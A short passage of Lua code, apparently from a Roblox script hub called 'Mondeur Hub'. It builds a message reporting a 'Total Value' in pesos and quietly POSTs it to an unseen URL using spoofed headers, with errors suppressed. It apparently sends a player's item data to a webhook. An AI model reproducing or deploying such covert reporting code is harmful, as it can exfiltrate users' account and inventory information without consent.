            },
            footer = {text = "Mondeur Hub | Total Value: ₱"..string.format("%.2f", tot)}
        }}
    }
    pcall(function() req({Url = url, Method = "POST", Headers = spoof_headers, Body = Http:JSONEncode(payload)}) end)
end

